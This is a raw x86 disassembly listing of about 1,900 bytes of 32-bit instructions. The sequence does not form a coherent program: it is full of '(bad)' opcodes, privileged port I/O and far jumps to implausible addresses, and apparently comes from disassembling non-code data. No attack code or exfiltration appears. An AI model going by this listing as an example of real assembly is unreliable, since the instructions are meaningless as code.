  42b115:	push   DWORD PTR [edx-0x45]
  42b118:	xchg   ecx,eax
  42b119:	call   FWORD PTR [ebx+ebp*4+0x3c]
  42b11d:	shl    al,0xe3
  42b120:	push   cs
  42b121:	add    BYTE PTR [eax+0xfd8a49],dl
  42b127:	add    BYTE PTR [eax],al
  42b129:	add    BYTE PTR [eax],al
  42b12b:	inc    edx
  42b12c:	pushf  
  42b12d:	imul   ecx,edx,0xffffffe8
  42b130:	cmp    edi,DWORD PTR [esi-0x1]
  42b133:	xlat   BYTE PTR ds:[ebx]
  42b134:	int    0x52
  42b136:	or     edx,DWORD PTR [esp+ecx*8]
  42b139:	adc    al,BYTE PTR [eax]
  42b13b:	nop
  42b13c:	not    ch
  42b13e:	out    0x60,eax
  42b140:	in     al,0x50
  42b142:	call   0x556852
  42b147:	adc    al,0xa
  42b149:	xchg   DWORD PTR [esi+0x1b],ebp
  42b14c:	nop
  42b14d:	cli    
  42b14e:	xlat   BYTE PTR cs:[ebx]
  42b150:	loop   0x42b127
  42b152:	repz or dl,BYTE PTR [eax+0x7e1b4efa]
  42b159:	fmul   DWORD PTR ds:0x456849d0
  42b15f:	js     0x42b13f
  42b161:	aad    0xf
  42b163:	loopne 0x42b0e8
  42b165:	pop    ss
  42b166:	(bad)  
  42b167:	aad    0xf5
  42b169:	mov    ds:0x23e89efa,al
  42b16e:	test   DWORD PTR [eax+0x15],edx
  42b171:	les    edi,FWORD PTR [esi-0x2b]
  42b174:	jns    0x42b18d
  42b176:	jne    0x42b1f6
  42b178:	jae    0x42b18a
  42b17a:	(bad)  
  42b17b:	int    0x79
  42b17d:	mov    al,ds:0x1c363f52
  42b182:	sti    
  42b183:	jle    0x42b13d
  42b185:	and    eax,DWORD PTR [ebp+0x38fc3550]
  42b18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b18c:	pop    ecx
  42b18d:	xchg   DWORD PTR [edx],edx
  42b18f:	add    BYTE PTR [eax],al
  42b191:	add    BYTE PTR [eax],al
  42b193:	add    BYTE PTR [edi],bl
  42b195:	pop    ss
  42b196:	(bad)
  42b199:	dec    edx
  42b19a:	sahf   
  42b19b:	pop    ds
  42b19c:	adc    esi,DWORD PTR [edi]
  42b19e:	hlt    
  42b19f:	inc    DWORD PTR [esi]
  42b1a1:	bswap  eax
  42b1a3:	cli    
  42b1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1a5:	mov    dl,0x75
  42b1a7:	hlt    
  42b1a8:	mov    bh,0xb2
  42b1aa:	shr    bl,0xbe
  42b1ad:	jnp    0x42b1d8
  42b1af:	adc    ebx,DWORD PTR [ebp+0x46]
  42b1b2:	jno    0x42b1f5
  42b1b4:	fcmovnu st,st(4)
  42b1b6:	mov    ebp,0xf5d5401b
  42b1bb:	add    ecx,ebx
  42b1bd:	lahf   
  42b1be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1bf:	clc    
  42b1c0:	iret   
  42b1c1:	shl    BYTE PTR ds:0xb1e51704,0x1b
  42b1c8:	mov    ch,0xaf
  42b1ca:	cmc    
  42b1cb:	add    edx,DWORD PTR [esi]
  42b1cd:	jae    0x42b1f4
  42b1cf:	mov    dl,0x3e
  42b1d1:	imul   edi,DWORD PTR [eax-0x7dcc6001],0x3fd46f7
  42b1db:	jg     0x42b15e
  42b1dd:	(bad)  
  42b1de:	jo     0x42b171
  42b1e0:	xchg   edi,eax
  42b1e1:	sub    DWORD PTR [eax+edi*8],ebx
  42b1e4:	jbe    0x42b1e9
  42b1e6:	rol    BYTE PTR [ebx],0x5
  42b1e9:	out    dx,eax
  42b1ea:	adc    esp,ebp
  42b1ec:	(bad)  
  42b1ee:	cli    
  42b1ef:	or     ah,0x8e
  42b1f2:	or     eax,0x549d5ab4
  42b1f7:	clc    
  42b1f8:	add    BYTE PTR [eax],al
  42b1fa:	add    BYTE PTR [eax],al
  42b1fc:	add    BYTE PTR [edi+0x1503b5c0],dl
  42b202:	jae    0x42b1ae
  42b204:	mov    dh,0xd6
  42b207:	adc    eax,edi
  42b209:	xchg   esp,eax
  42b20a:	fcomip st,st(1)
  42b20c:	jle    0x42b1ea
  42b20e:	mov    gs,ecx
  42b210:	(bad)  
  42b211:	sar    DWORD PTR [edx-0x6d8c4091],0xc7
  42b218:	rol    DWORD PTR [edi+0xf08b827],0x46
  42b21f:	stc    
  42b220:	or     ebx,DWORD PTR [ecx]
  42b222:	test   DWORD PTR [esi],0xbfd4fbcd
  42b228:	jmp    0x575b0a9
  42b22d:	je     0x42b215
  42b22f:	xor    cl,BYTE PTR [ecx]
  42b231:	mov    dh,BYTE PTR [ebx+0xe]
  42b234:	pop    esp
  42b235:	cwde   
  42b236:	das    
  42b237:	rcl    DWORD PTR [ebx+ebp*8+0x2c],0xdd
  42b23c:	push   ebx
  42b23d:	mov    ebp,fs
  42b23f:	inc    ebx
  42b240:	ror    DWORD PTR [edi+0xfe90ed6],1
  42b246:	jae    0x42b2aa
  42b248:	mov    ah,dh
  42b24a:	adc    eax,0xfce7474c
  42b24f:	(bad)  
  42b250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b251:	test   al,0x14
  42b253:	cwde   
  42b254:	sub    eax,0x2795bdb8
  42b259:	nop
  42b25a:	sub    edi,DWORD PTR [ebp-0xf]
  42b25d:	sbb    bl,al
  42b25f:	(bad)  
  42b260:	outs   dx,DWORD PTR ds:[esi]
  42b261:	add    BYTE PTR [eax],al
  42b263:	add    BYTE PTR [eax],al
  42b265:	add    BYTE PTR [edx-0x3f],al
  42b268:	sahf   
  42b269:	call   0x1a810112
  42b26e:	inc    edi
  42b26f:	add    eax,DWORD PTR [edx+esi*2-0x75]
  42b273:	aad    0xd9
  42b275:	pop    esi
  42b276:	in     eax,dx
  42b277:	jmp    0xa96c1492
  42b27c:	xchg   edi,eax
  42b27d:	sub    BYTE PTR [ebp+0x17],dh
  42b280:	sub    BYTE PTR [eax+edi*8],ch
  42b283:	enter  0x288f,0x97
  42b287:	int3   
  42b288:	push   cs
  42b289:	push   0x7e
  42b28b:	mov    dl,0x40
  42b28d:	cwde   
  42b28e:	mov    esp,0x206bf769
  42b293:	push   ebp
  42b294:	in     al,dx
  42b295:	gs aam 0xde
  42b298:	inc    ebx
  42b299:	bound  ecx,QWORD PTR [ecx]
  42b29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b29c:	aaa    
  42b29d:	xchg   esi,eax
  42b29e:	sbb    edx,esp
  42b2a0:	cld    
  42b2a1:	add    BYTE PTR [esi+edx*8],ah
  42b2a4:	fsubr  st,st(0)
  42b2a6:	in     eax,0xaa
  42b2a8:	push   cs
  42b2a9:	add    BYTE PTR [edx-0x7a],dh
  42b2ac:	xchg   ecx,eax
  42b2ad:	fild   DWORD PTR [ebp+0x70f69370]
  42b2b3:	push   esp
  42b2b4:	jb     0x42b30d
  42b2b6:	into   
  42b2b7:	pop    ebx
  42b2b8:	mov    BYTE PTR [edx],dl
  42b2ba:	mov    ecx,0xa70bf3ae
  42b2bf:	pop    ds
  42b2c0:	xchg   ebp,eax
  42b2c1:	iret   
  42b2c2:	rol    DWORD PTR [eax+0x68],0x0
  42b2c6:	mov    ecx,0x3bf6d5
  42b2cb:	add    BYTE PTR [eax],al
  42b2cd:	add    BYTE PTR [eax],al
  42b2cf:	iret   
  42b2d0:	cmp    ecx,DWORD PTR [ebx]
  42b2d2:	push   0xffffffa8
  42b2d4:	shl    DWORD PTR [edx+0x24],0xc9
  42b2d8:	aad    0xc0
  42b2da:	mov    esp,edx
  42b2dc:	mov    eax,0xb0b952b9
  42b2e1:	xchg   ebx,eax
  42b2e2:	dec    esp
  42b2e3:	aad    0x48
  42b2e5:	xchg   edi,eax
  42b2e6:	add    DWORD PTR [ecx+esi*8],esp
  42b2e9:	bound  eax,QWORD PTR [ecx+ecx*8]
  42b2ec:	mov    al,0xf3
  42b2ee:	or     edx,esi
  42b2f0:	xchg   esi,eax
  42b2f1:	mul    ah
  42b2f3:	je     0x42b2a5
  42b2f5:	push   cs
  42b2f6:	xor    ch,BYTE PTR [ecx+0x525d4622]
  42b2fc:	or     DWORD PTR [edx-0x4d086f8],ebp
  42b302:	or     al,0x1a
  42b304:	xlat   BYTE PTR ds:[ebx]
  42b305:	dec    edx
  42b306:	and    al,0x71
  42b308:	sbb    eax,0x23c2573e
  42b30d:	xor    BYTE PTR [eax],ah
  42b30f:	mov    dl,0xea
  42b311:	or     eax,ebx
  42b313:	mov    dl,0xc0
  42b315:	imul   edi,eax,0x6e
  42b318:	mov    dl,0x92
  42b31a:	pushf  
  42b31b:	cmp    DWORD PTR [eax+0x5908d0e],esi
  42b321:	hlt    
  42b322:	pop    ds
  42b323:	shl    BYTE PTR [ecx+0x49907763],0x94
  42b32a:	rcr    BYTE PTR [edi-0x6fff9633],0x49
  42b331:	fistp  DWORD PTR [ebx+0x0]
  42b334:	add    BYTE PTR [eax],al
  42b336:	add    BYTE PTR [eax],al
  42b338:	mov    ah,0x6d
  42b33a:	jae    0x52fd50
  42b340:	bound  ecx,QWORD PTR [ebx-0x27]
  42b343:	jnp    0x42b2f1
  42b345:	test   eax,0x17a3777f
  42b34a:	push   0x54
  42b34c:	lods   al,BYTE PTR ds:[esi]
  42b34d:	test   eax,0x493aecbf
  42b352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b353:	dec    ebp
  42b354:	sbb    ecx,DWORD PTR [ebx+ecx*1]
  42b357:	enter  0x493b,0x10
  42b35b:	test   al,dl
  42b35d:	mov    ch,0xb1
  42b35f:	gs nop
  42b361:	(bad)  
  42b362:	(bad)  
  42b363:	and    edi,DWORD PTR [ecx+ebx*4-0x78]
  42b367:	add    al,0xd
  42b369:	mov    ?,esi
  42b36b:	pop    ds
  42b36c:	inc    eax
  42b36d:	sub    al,0xc5
  42b36f:	cli    
  42b370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b371:	mov    eax,esp
  42b373:	aas    
  42b374:	nop
  42b375:	(bad)  
  42b376:	push   edx
  42b377:	je     0x42b350
  42b379:	enter  0x237e,0xa0
  42b37d:	inc    esi
  42b37e:	xchg   DWORD PTR [edi],edi
  42b380:	sbb    al,BYTE PTR ds:0xba217f4
  42b386:	clc    
  42b387:	xchg   ah,dl
  42b389:	lods   eax,DWORD PTR ds:[esi]
  42b38a:	out    0x2e,al
  42b38c:	into   
  42b38d:	push   ecx
  42b38e:	imul   edx,DWORD PTR [esp+esi*2-0x57],0x816c4c6a
  42b396:	ror    eax,0x9
  42b399:	or     eax,0x13f4
  42b39e:	add    BYTE PTR [eax],al
  42b3a0:	add    BYTE PTR [ebx+0x5cf337b2],dl
  42b3a6:	das    
  42b3a7:	or     DWORD PTR ss:[edi+0x42caf681],esp
  42b3ae:	(bad)  
  42b3b0:	retf   0xde2e
  42b3b3:	repz jp 0x42b396
  42b3b6:	sub    BYTE PTR [edx+0xf27a7e7],al
  42b3bc:	retf   
  42b3bd:	(bad)  
  42b3be:	(bad)  
  42b3c0:	xchg   ecx,eax
  42b3c1:	and    edx,DWORD PTR [edi-0x5fe06a44]
  42b3c7:	mov    ch,0xae
  42b3c9:	dec    ecx
  42b3ca:	cmc    
  42b3cb:	and    BYTE PTR [ebx-0x4485a2c],al
  42b3d1:	xlat   BYTE PTR ds:[ebx]
  42b3d2:	pop    esp
  42b3d3:	cmp    ch,al
  42b3d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3d6:	mov    cl,0x22
  42b3d8:	and    DWORD PTR [edi-0x2a],eax
  42b3db:	sbb    eax,edi
  42b3dd:	mov    edi,0x527cd3dc
  42b3e2:	ret    0xb55e
  42b3e5:	xchg   edi,eax
  42b3e6:	sub    DWORD PTR [eax+eax*1],ebx
  42b3e9:	sbb    esp,esp
  42b3eb:	jmp    0x9e8a4543
  42b3f0:	mov    eax,0x1f79460e
  42b3f5:	mov    al,ds:0x817b03e5
  42b3fa:	ds cmp al,0xfc
  42b3fd:	sahf   
  42b3fe:	clc    
  42b3ff:	leave  
  42b400:	cmp    BYTE PTR [eax+0x52],0xe5
  42b404:	xchg   DWORD PTR [eax],eax
  42b406:	add    BYTE PTR [eax],al
  42b408:	add    BYTE PTR [eax],al
  42b40a:	sbb    BYTE PTR [ebx+0x6db703f5],dh
  42b410:	test   eax,0x5cbee20e
  42b415:	xchg   ebp,eax
  42b416:	(bad)  
  42b417:	pop    edx
  42b418:	enter  0x4f8a,0x52
  42b41c:	jb     0x42b461
  42b41e:	mov    esp,0x109a0ec8
  42b423:	clc    
  42b424:	jmp    0x87ac:0x99b71999
  42b42b:	loop   0x42b418
  42b42d:	xlat   BYTE PTR ds:[ebx]
  42b42e:	xchg   esi,eax
  42b42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b430:	dec    esi
  42b431:	sti    
  42b432:	push   ebx
  42b433:	push   edx
  42b434:	xchg   ebx,eax
  42b435:	sub    edi,edi
  42b437:	in     al,dx
  42b438:	pop    DWORD PTR [edi+ebx*4-0x765f9e49]
  42b43f:	cld    
  42b440:	push   es
  42b441:	mov    ebx,0x949849d0
  42b446:	lahf   
  42b447:	mov    eax,ds:0x7c140144
  42b44c:	push   cs
  42b44d:	sbb    esp,DWORD PTR [esi]
  42b44f:	stos   BYTE PTR es:[edi],al
  42b450:	pop    ds
  42b451:	aas    
  42b452:	in     al,dx
  42b453:	add    ah,ch
  42b455:	push   edi
  42b456:	nop
  42b457:	cmp    bl,BYTE PTR [edx-0x3f]
  42b45a:	popf   
  42b45b:	les    edx,FWORD PTR [esi]
  42b45d:	jb     0x42b3e5
  42b45f:	cmp    eax,DWORD PTR [edx-0x43]
  42b462:	pushf  
  42b463:	jp     0x42b4ce
  42b465:	jmp    0x1e11eafd
  42b46a:	mov    al,0x0
  42b46c:	call   0x0:0x24
  42b473:	and    dl,0x78
  42b476:	in     al,dx
  42b477:	push   ds
  42b478:	mul    edx
  42b47a:	cmp    DWORD PTR [ebp+0x5bdceb84],eax
  42b480:	mov    edi,0x720ee94e
  42b485:	arpl   sp,bx
  42b487:	adc    bh,cl
  42b489:	jmp    0x9d1f:0xebbc1ee4
  42b490:	cld    
  42b491:	ss pop esi
  42b493:	pop    edi
  42b494:	sar    ebp,1
  42b496:	test   al,0x93
  42b498:	add    cl,BYTE PTR [esi]
  42b49a:	inc    edx
  42b49b:	xchg   edx,eax
  42b49c:	mov    al,ds:0x19f700ce
  42b4a1:	xlat   BYTE PTR ds:[ebx]
  42b4a2:	ret    
  42b4a3:	pop    ds
  42b4a4:	retf   0x83dd
  42b4a7:	inc    edi
  42b4a8:	mov    ch,0x62
  42b4aa:	or     esp,DWORD PTR [esi+0x68]
  42b4ad:	jmp    0x2c84a1c7
  42b4b2:	add    BYTE PTR [edx-0x5a9813a8],bh
  42b4b8:	int3   
  42b4b9:	dec    esi
  42b4ba:	add    BYTE PTR [esi+0x39135849],al
  42b4c0:	mov    ch,0x91
  42b4c2:	sar    BYTE PTR [ecx+edi*4+0x3c],0xc0
  42b4c7:	xchg   edx,eax
  42b4c8:	mov    edx,0xb5b90695
  42b4cd:	dec    eax
  42b4ce:	ret    0xb4fd
  42b4d1:	imul   ebp,esp,0xfffffff5
  42b4d4:	add    DWORD PTR [ebx+0x56],eax
  42b4d7:	add    BYTE PTR [eax],al
  42b4d9:	add    BYTE PTR [eax],al
  42b4db:	add    BYTE PTR [esi-0x26dbad2f],bl
  42b4e1:	add    al,0x72
  42b4e3:	or     BYTE PTR [eax+0x9],al
  42b4e6:	xor    BYTE PTR [eax],ah
  42b4e8:	inc    edx
  42b4e9:	mov    esp,0xb55a90f6
  42b4ee:	push   cs
  42b4ef:	test   ecx,ebp
  42b4f1:	daa    
  42b4f2:	popa   
  42b4f3:	mov    ecx,DWORD PTR [ebp-0x7ae3a6]
  42b4f9:	cmp    eax,0x1d006a13
  42b4fe:	cmc    
  42b4ff:	push   0x34
  42b501:	jns    0x42b533
  42b503:	adc    BYTE PTR [ecx+0x368b112c],ch
  42b509:	lods   al,BYTE PTR ds:[esi]
  42b50a:	pop    ebp
  42b50b:	xchg   ebx,eax
  42b50c:	imul   esi,DWORD PTR [ecx+edx*4-0x64e38340],0x5c4a9d44
  42b517:	push   0x60
  42b519:	retf   
  42b51a:	xlat   BYTE PTR ds:[ebx]
  42b51b:	call   0xa1bdb0
  42b520:	nop
  42b521:	(bad)  
  42b522:	dec    edi
  42b523:	jne    0x42b4fb
  42b525:	dec    esp
  42b526:	aaa    
  42b527:	lea    ecx,[esp+ecx*2-0x2aadd887]
  42b52e:	pop    es
  42b52f:	shl    DWORD PTR ds:0xff0b1cd5,1
  42b535:	adc    eax,0x2d930ff4
  42b53a:	hlt    
  42b53b:	adc    ecx,DWORD PTR ds:0x510e19
  42b541:	add    BYTE PTR [eax],al
  42b543:	add    BYTE PTR [eax],al
  42b545:	pop    ss
  42b546:	es hlt 
  42b548:	sbb    ecx,DWORD PTR [edi]
  42b54a:	outs   dx,DWORD PTR ds:[esi]
  42b54b:	adc    BYTE PTR [ecx],0x50
  42b54e:	pop    ecx
  42b54f:	mov    ecx,0x839a1558
  42b554:	or     dh,BYTE PTR [esi+0x56]
  42b557:	ins    DWORD PTR es:[edi],dx
  42b558:	pop    ebp
  42b559:	xchg   ecx,eax
  42b55a:	fs adc eax,0x394dd87
  42b560:	jnp    0x42b52c
  42b562:	je     0x42b5da
  42b564:	or     ebx,DWORD PTR [esi]
  42b566:	pop    ecx
  42b567:	jmp    0x539d151d
  42b56c:	loopne 0x42b506
  42b56e:	pop    esp
  42b56f:	push   ebx
  42b570:	pop    ebx
  42b571:	pop    esi
  42b572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b573:	mov    ebx,0x556dcc7e
  42b578:	push   edx
  42b579:	sbb    ebp,DWORD PTR [ebx]
  42b57b:	ins    BYTE PTR es:[edi],dx
  42b57c:	dec    edx
  42b57d:	je     0x42b5a0
  42b57f:	popf   
  42b580:	(bad)  
  42b581:	lahf   
  42b582:	pop    ecx
  42b583:	xchg   ebp,eax
  42b584:	jp     0x42b5e6
  42b586:	pop    ecx
  42b587:	pushf  
  42b588:	or     BYTE PTR [edi-0x62053fb1],cl
  42b58e:	mov    ecx,0xa7903fe4
  42b593:	push   ebx
  42b594:	push   edx
  42b595:	or     ecx,edx
  42b597:	xchg   edx,eax
  42b598:	and    ch,BYTE PTR [esi-0x4e]
  42b59b:	js     0x42b527
  42b59d:	mov    ebx,0xf7e9c2b2
  42b5a2:	mov    dl,0x15
  42b5a4:	add    al,0x90
  42b5a6:	fdivr  st(5),st
  42b5a8:	or     al,BYTE PTR [eax]
  42b5aa:	add    BYTE PTR [eax],al
  42b5ac:	add    BYTE PTR [eax],al
  42b5ae:	test   DWORD PTR [edx+0x5047c078],ebx
  42b5b4:	ret    
  42b5b5:	mov    ecx,DWORD PTR [ebp-0x2d830a0e]
  42b5bb:	sahf   
  42b5bc:	jb     0x42b602
  42b5be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5bf:	mov    dh,0xc7
  42b5c1:	inc    ebx
  42b5c2:	das    
  42b5c3:	scas   al,BYTE PTR es:[edi]
  42b5c4:	jg     0x42b5b5
  42b5c6:	sbb    al,dh
  42b5c8:	fincstp 
  42b5ca:	add    al,0xf8
  42b5cc:	shl    DWORD PTR [ebx-0xe4e5af6],0xc7
  42b5d3:	mov    dl,0x78
  42b5d5:	inc    eax
  42b5d6:	mov    WORD PTR [ebx],?
  42b5d8:	xor    al,0x1c
  42b5da:	xchg   edx,eax
  42b5db:	mov    dl,0xf5
  42b5dd:	add    esp,DWORD PTR [eax]
  42b5df:	mov    cl,0x53
  42b5e1:	inc    esi
  42b5e2:	mov    WORD PTR [edx+0x4916b323],?
  42b5e8:	push   eax
  42b5e9:	fadd   QWORD PTR [edi+eax*8]
  42b5ec:	icebp  
  42b5ed:	popf   
  42b5ee:	iret   
  42b5ef:	in     al,0xd4
  42b5f1:	lock addr16 test al,0x35
  42b5f5:	add    al,0x17
  42b5f7:	not    DWORD PTR [ecx]
  42b5f9:	xchg   esp,ecx
  42b5fb:	mov    ebp,0x7787c26e
  42b600:	cmp    eax,0xf5aea7e8
  42b605:	add    edi,DWORD PTR [ebx]
  42b607:	ja     0x42b605
  42b609:	fist   DWORD PTR [edi+0x4ea9f64e]
  42b60f:	in     eax,0x60
  42b611:	adc    al,0x0
  42b613:	add    BYTE PTR [eax],al
  42b615:	add    BYTE PTR [eax],al
  42b617:	xor    BYTE PTR [ebp+0x31958ff6],0xf
  42b61e:	idiv   DWORD PTR [edi]
  42b620:	dec    esi
  42b621:	arpl   bp,sp
  42b623:	inc    esi
  42b624:	push   cs
  42b625:	clc    
  42b626:	cli    
  42b627:	adc    ecx,edi
  42b629:	xor    dh,cl
  42b62b:	xchg   ebx,eax
  42b62c:	(bad)  
  42b62d:	adc    eax,0xeb9e0156
  42b632:	hlt    
  42b633:	das    
  42b634:	mov    ds:0xf0c8e94e,eax
  42b639:	and    bl,BYTE PTR [edi-0x61f1492b]
  42b63f:	mov    dh,0x4b
  42b641:	cwde   
  42b642:	sahf   
  42b643:	out    0x36,eax
  42b645:	(bad)  
  42b646:	popf   
  42b647:	sub    eax,0x239897e4
  42b64c:	fadd   DWORD PTR [edx]
  42b64e:	fs push edx
  42b650:	cmp    BYTE PTR [esi],0xb8
  42b653:	call   0x994d:0xd3df4aa7
  42b65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b65b:	inc    edi
  42b65c:	int    0xd2
  42b65e:	in     eax,0x74
  42b660:	ret    0x96fe
  42b663:	call   0x4a4d:0xd3fa1ea7
  42b66a:	ds push ebp
  42b66c:	loopne 0x42b605
  42b66e:	fsub   DWORD PTR [ecx]
  42b670:	jno    0x42b6c7
  42b672:	in     eax,0x92
  42b674:	mov    dl,0xe
  42b676:	jmp    0x6ea166cb
  42b67b:	add    BYTE PTR [eax],al
  42b67d:	add    BYTE PTR [eax],al
  42b67f:	add    ah,dl
  42b681:	dec    ebp
  42b682:	ins    BYTE PTR es:[edi],dx
  42b683:	dec    edi
  42b684:	ror    BYTE PTR [ebx+0x20],0xae
  42b688:	sub    ecx,eax
  42b68a:	dec    esi
  42b68b:	jo     0x42b6a7
  42b68d:	repnz mov es,WORD PTR [edi]
  42b690:	add    al,0x4c
  42b692:	inc    ebp
  42b693:	ds pop ds
  42b695:	cmp    BYTE PTR [edi-0x6a4d6c17],bh
  42b69b:	add    bh,cl
  42b69d:	fimul  DWORD PTR [esi]
  42b69f:	add    BYTE PTR [ecx-0x38],ch
  42b6a2:	test   al,0xa0
  42b6a4:	imul   esi,DWORD PTR [ecx-0xff717f2],0x2f27000e
  42b6ae:	jge    0x50eda3
  42b6b4:	imul   ebp,DWORD PTR [ecx-0x4ec63955],0x4a954494
  42b6be:	xchg   edi,eax
  42b6bf:	mov    esi,0xeb745
  42b6c4:	mov    al,0xf8
  42b6c6:	add    bh,BYTE PTR es:[ecx]
  42b6c9:	mov    cl,0xd0
  42b6cb:	xchg   BYTE PTR ds:0x28000eb7,ch
  42b6d1:	repnz nop
  42b6d3:	xor    BYTE PTR [ebx],ch
  42b6d5:	mov    cl,0xe
  42b6d7:	pop    esp
  42b6d8:	outs   dx,BYTE PTR ds:[esi]
  42b6d9:	jbe    0x42b6c7
  42b6db:	xchg   DWORD PTR [edi],esi
  42b6dd:	dec    ecx
  42b6de:	xchg   ebp,eax
  42b6df:	inc    esp
  42b6e0:	aad    0x40
  42b6e2:	xchg   edi,eax
  42b6e3:	inc    esi
  42b6e4:	add    BYTE PTR [eax],al
  42b6e6:	add    BYTE PTR [eax],al
  42b6e8:	add    ch,ch
  42b6ea:	int    0x52
  42b6ec:	and    al,0xc5
  42b6ee:	(bad)  
  42b6ef:	push   eax
  42b6f0:	adc    BYTE PTR [esi-0x31],cl
  42b6f3:	rcr    BYTE PTR [esi+0x2b],1
  42b6f6:	inc    ebp
  42b6f7:	in     al,dx
  42b6f8:	push   ebp
  42b6f9:	jb     0x42b69b
  42b6fb:	cdq    
  42b6fc:	mov    gs,WORD PTR [ecx-0x9fff14c]
  42b702:	mov    dl,0x5e
  42b704:	(bad)
  42b708:	cmc    
  42b709:	test   eax,0x4f8d0eb0
  42b70e:	xor    DWORD PTR [esi],ecx
  42b710:	add    BYTE PTR [ecx-0x5638ff58],bh
  42b716:	mov    al,0x99
  42b718:	mov    ss,WORD PTR [eax-0x6fffeff5]
  42b71e:	xor    ebx,ebp
  42b720:	ret    0x5990
  42b723:	gs dec edx
  42b725:	add    BYTE PTR [edx],ah
  42b727:	(bad)  
  42b728:	stc    
  42b729:	ja     0x42b6f0
  42b72b:	fs dec edx
  42b72d:	test   BYTE PTR [ecx],dh
  42b72f:	mov    ch,0xf9
  42b731:	addr16 aad 0xfd
  42b734:	inc    ebx
  42b735:	mov    ah,0x41
  42b737:	adc    ebx,eax
  42b739:	mov    ?,ebp
  42b73b:	push   0x40
  42b73d:	nop
  42b73e:	gs ja  0x168999b
  42b745:	nop
  42b746:	pop    ecx
  42b747:	imul   eax,edx,0xffffffd6
  42b74a:	xchg   edi,eax
  42b74b:	jmp    0x42b74c
  42b74d:	add    BYTE PTR [eax],al
  42b74f:	add    BYTE PTR [eax],al
  42b751:	add    dl,al
  42b753:	shl    BYTE PTR [ebx+0x6b0e9823],1
  42b759:	daa    
  42b75a:	mov    BYTE PTR [ebx+ebp*2],0xb9
  42b75e:	pop    eax
  42b75f:	push   edi
  42b760:	adc    BYTE PTR [eax],al
  42b762:	ret    
  42b763:	mov    ds:0x6d7cfb6c,eax
  42b768:	imul   edx,DWORD PTR [ecx+0x1057c4],0xb
  42b76f:	pop    eax
  42b770:	(bad)  [edi]
  42b772:	fs js  0x42b743
  42b775:	jle    0x42b749
  42b777:	pop    ebp
  42b778:	fptan  
  42b77a:	bound  esp,QWORD PTR [edi-0x6e]
  42b77d:	shl    DWORD PTR [eax+0x63001057],0xd0
  42b784:	adc    ebx,edi
  42b786:	pusha  
  42b787:	imul   eax,ecx,0x147213c8
  42b78d:	or     ebx,DWORD PTR ds:0x4d59b41a
  42b793:	mov    al,ds:0xb2900450
  42b798:	mov    DWORD PTR [ebx-0x49],0xe17b2445
  42b79f:	mov    dh,bh
  42b7a1:	add    edx,DWORD PTR [eax+0xcafb57f]
  42b7a7:	inc    esp
  42b7a8:	jmp    0x9001:0xa23916eb
  42b7af:	mov    dl,0x70
  42b7b1:	mov    BYTE PTR [ebx+0xf570be],dh
  42b7b7:	add    BYTE PTR [eax],al
  42b7b9:	add    BYTE PTR [eax],al
  42b7bb:	sahf   
  42b7bc:	mov    cl,cl
  42b7be:	neg    BYTE PTR [edi-0x60ffc8d1]
  42b7c4:	je     0x42b78e
  42b7c6:	adc    DWORD PTR [edi+0x72],edi
  42b7c9:	mov    ebp,0xf5b605a5
  42b7ce:	jp     0x42b7ce
  42b7d0:	push   esi
  42b7d1:	and    eax,0xde090eaf
  42b7d6:	add    DWORD PTR [eax+0xd31e8b2],edx
  42b7dc:	dec    ebx
  42b7dd:	mov    bl,cl
  42b7df:	into   
  42b7e0:	aaa    
  42b7e1:	stos   BYTE PTR es:[edi],al
  42b7e2:	fisttp WORD PTR [ebx-0x3baa8f1c]
  42b7e8:	mov    al,0xf5
  42b7ea:	add    ecx,DWORD PTR [edi]
  42b7ec:	mov    ah,0xd0
  42b7ee:	jmp    0x42b773
  42b7f0:	mov    eax,0xb5d282b7
  42b7f5:	mov    al,ds:0x11407e2e
  42b7fa:	clc    
  42b7fb:	adc    BYTE PTR [ecx+0x6],dh
  42b7fe:	add    dl,BYTE PTR [eax-0x6e84d84e]
  42b804:	dec    ebx
  42b805:	add    BYTE PTR es:[edx-0x19],ch
  42b809:	cmp    al,0x42
  42b80b:	mov    WORD PTR [edx+0x72c17b0b],?
  42b811:	hlt    
  42b812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b813:	or     dh,dl
  42b815:	push   cs
  42b816:	jmp    0xaf822ba6
  42b81b:	mov    ?,WORD PTR [ebx]
  42b81d:	(bad)  [esi+0x0]
  42b823:	add    BYTE PTR [ebp-0x73d665f2],bl
  42b829:	pop    edx
  42b82a:	lods   eax,DWORD PTR ds:[esi]
  42b82b:	cmp    DWORD PTR [esi-0x6fe067b3],edx
  42b831:	jne    0x42b848
  42b833:	in     eax,0xdd
  42b835:	repnz push cs
  42b837:	pop    ds
  42b838:	xchg   ebp,eax
  42b839:	pop    ebx
  42b83a:	psubsw mm2,QWORD PTR [ebx+0x67c56ac9]
  42b841:	dec    edx
  42b842:	pusha  
  42b843:	sti    
  42b844:	(bad)  
  42b846:	xor    ah,ch
  42b848:	jnp    0x42b88e
  42b84a:	push   es
  42b84b:	push   esi
  42b84c:	xchg   esi,eax
  42b84d:	xor    DWORD PTR [ebx+0x5],ebx
  42b850:	nop
  42b851:	pop    edx
  42b852:	mov    edi,0xd0b293e9
  42b857:	in     eax,0x93
  42b859:	leave  
  42b85a:	push   0xd
  42b85c:	nop
  42b85d:	mov    dl,0x61
  42b85f:	out    0x12,eax
  42b861:	jnp    0x42b84f
  42b863:	sub    ebx,DWORD PTR [edi]
  42b865:	dec    edx
  42b866:	mul    DWORD PTR ds:0xbfec4be3
  42b86c:	mov    al,BYTE PTR [ebx-0x6e]
  42b86f:	cmp    esp,DWORD PTR [eax]
  42b871:	mov    esi,0x179bf797
  42b876:	psubsw mm2,QWORD PTR [ebx-0x7516cb37]
  42b87d:	cdq    
  42b87e:	(bad)  
  42b87f:	sub    esp,edi
  42b881:	enter  0xe92c,0x21
  42b885:	mov    edi,0x52fe
